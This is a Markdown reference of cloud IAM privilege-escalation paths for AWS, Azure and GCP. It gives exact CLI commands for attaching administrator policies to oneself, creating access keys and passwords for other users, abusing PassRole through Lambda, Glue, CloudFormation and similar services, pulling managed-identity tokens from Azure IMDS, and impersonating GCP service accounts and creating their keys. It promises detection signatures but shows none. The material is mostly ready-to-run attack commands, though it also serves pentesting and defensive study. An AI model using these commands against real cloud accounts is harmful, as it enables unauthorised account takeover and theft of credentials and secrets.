# Cloud IAM Privilege Escalation Reference

Detailed escalation paths per provider with exact CLI commands and detection signatures.

---

## AWS — 31 confirmed paths (BishopFox / Rhino Security Labs)

### Category: Policies on current identity

| Path | Required permission | Command |
|------|--------------------|---------| 
| Create policy version | `iam:CreatePolicyVersion` | `aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default` |
| Restore old policy version | `iam:SetDefaultPolicyVersion` | `aws iam set-default-policy-version --policy-arn <arn> --version-id v2` |
| Attach policy to self | `iam:AttachUserPolicy` | `aws iam attach-user-policy --user-name $USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` |
| Attach policy to group | `iam:AttachGroupPolicy` | `aws iam attach-group-policy --group-name <group> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` |
| Attach policy to assumable role | `iam:AttachRolePolicy` | `aws iam attach-role-policy --role-name <role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` |
| Inline policy on self | `iam:PutUserPolicy` | `aws iam put-user-policy --user-name $USER --policy-name pwn --policy-document file://admin.json` |
| Inline policy on group | `iam:PutGroupPolicy` | `aws iam put-group-policy --group-name <group> --policy-name pwn --policy-document file://admin.json` |
| Inline policy on role | `iam:PutRolePolicy` | `aws iam put-role-policy --role-name <role> --policy-name pwn --policy-document file://admin.json` |
| Add self to admin group | `iam:AddUserToGroup` | `aws iam add-user-to-group --group-name <admin-group> --user-name $USER` |

### Category: Permissions on other users

| Path | Required permission | Command |
|------|--------------------|---------| 
| Create access key for other user | `iam:CreateAccessKey` | `aws iam create-access-key --user-name <target>` |
| Create console password for user | `iam:CreateLoginProfile` | `aws iam create-login-profile --user-name <target> --password '...' --no-password-reset-required` |
| Update console password for user | `iam:UpdateLoginProfile` | `aws iam update-login-profile --user-name <target> --password '...'` |

### Category: PassRole to services

| Path | Required permissions | Notes |
|------|---------------------|-------|
| EC2 with instance profile | `iam:PassRole` + `ec2:RunInstances` | SSH or user-data to reach IMDS |
| Lambda invoke | `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Function runs code with passed role |
| Lambda via DynamoDB trigger | `iam:PassRole` + `lambda:CreateFunction` + `lambda:CreateEventSourceMapping` | No InvokeFunction needed |
| Lambda code update | `lambda:UpdateFunctionCode` | Overwrite existing function code |
| Glue endpoint create | `iam:PassRole` + `glue:CreateDevEndpoint` | SSH to endpoint, query IMDS |
| Glue endpoint update | `glue:UpdateDevEndpoint` | Inject SSH public key into existing endpoint |
| CloudFormation stack create | `iam:PassRole` + `cloudformation:CreateStack` | Stack runs template with passed role |
| CloudFormation stack update | `cloudformation:UpdateStack` | Update existing stack |
| Data Pipeline | `iam:PassRole` + `datapipeline:CreatePipeline` + `datapipeline:PutPipelineDefinition` | Pipeline executes AWS CLI commands |
| CodeBuild project | `iam:PassRole` + `codebuild:CreateProject` | BuildSpec runs arbitrary commands |
| SageMaker notebook | `iam:PassRole` + `sagemaker:CreateNotebookInstance` | Notebook queries IMDS for SA creds |
| SageMaker presigned URL | `sagemaker:CreatePresignedNotebookInstanceUrl` | Access existing notebook without SSH |

### Category: Assume role / trust manipulation

| Path | Required permissions |
|------|---------------------|
| Direct role assumption | `sts:AssumeRole` |
| Modify trust policy | `iam:UpdateAssumeRolePolicy` + `sts:AssumeRole` |

### Category: SSM / EC2 Connect (no SSH)

| Path | Required permissions |
|------|---------------------|
| SSM SendCommand | `ssm:SendCommand` on EC2 |
| SSM StartSession | `ssm:StartSession` on EC2 |
| EC2 Instance Connect | `ec2instanceconnect:SendSSHPublicKey` |

---

## Azure — Key escalation paths

### Managed Identity abuse

Highest-impact pattern: VM with Managed Identity assigned Owner/Contributor role.

```powershell
# From inside VM — authenticate as Managed Identity
az login --identity

# Get token via IMDS (PowerShell)
$token = (Invoke-WebRequest -Uri 'https://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"} -UseBasicParsing).Content | ConvertFrom-Json

# Add user to Owner role using REST API with Managed Identity token
# (See NetSPI PoC: https://gist.github.com/kfosaaen/535a607e39fc9a63ec6798d99da132e8)
```

Impact scenarios:
- Identity has Subscription Owner → add any user as Owner.
- Identity has Contributor → lateral movement to other VMs via `az vm run-command invoke`.
- Identity has access to Key Vaults → dump all secrets including local/domain credentials.
- Identity has rights to other subscriptions → pivot to higher-value environments.

### Service Principal abuse

| Permission | Escalation |
|-----------|------------|
| `Application.ReadWrite.All` | Add client secret or cert to any app registration → impersonate with its API permissions |
| `AppRoleAssignment.ReadWrite.All` | Grant MS Graph `RoleManagement.ReadWrite.Directory` to controlled SP |
| `RoleManagement.ReadWrite.Directory` | Assign Global Administrator to any user or SP |

```bash
# Enumerate Service Principal permissions via Graph API
az rest --method GET \
  --uri 'https://graph.microsoft.com/v1.0/servicePrincipals?$select=displayName,appRoles,appId'
```

### Automation Account runbooks

If a user has `Microsoft.Automation/automationAccounts/runbooks/write` + `Microsoft.Automation/automationAccounts/jobs/write` but not direct VM access:
- Create a runbook that calls `az` or ARM REST API with the Automation Account's RunAs credentials.
- RunAs principal often has Contributor or higher at subscription level.

---

## GCP — Key escalation paths

### Service Account impersonation chain

```bash
# Impersonate a higher-privilege SA (requires iam.serviceAccounts.actAs)
gcloud --impersonate-service-account=<high-priv-sa>@<project>.iam.gserviceaccount.com \
  iam service-accounts list

# Create SA key for persistent access (requires iam.serviceAccountKeys.create)
gcloud iam service-accounts keys create /tmp/key.json \
  --iam-account=<sa>@<project>.iam.gserviceaccount.com
```

### Workload Identity Federation — overly broad conditions

```bash
# Find pools and providers
gcloud iam workload-identity-pools list --location=global
gcloud iam workload-identity-pools providers describe <provider> \
  --workload-identity-pool=<pool> --location=global

# Inspect attribute conditions — look for wildcards like:
# attribute.repository=="org/*"  or missing conditions entirely
```

### Cloud Function escalation

```bash
# Create function with high-priv SA (requires iam:PassRole equivalent + cloudfunctions.functions.create)
gcloud functions deploy pwn-func \
  --runtime python39 \
  --trigger-http \
  --service-account <high-priv-sa>@<project>.iam.gserviceaccount.com \
  --source <path>

# Invoke to execute code as high-priv SA
gcloud functions call pwn-func
```
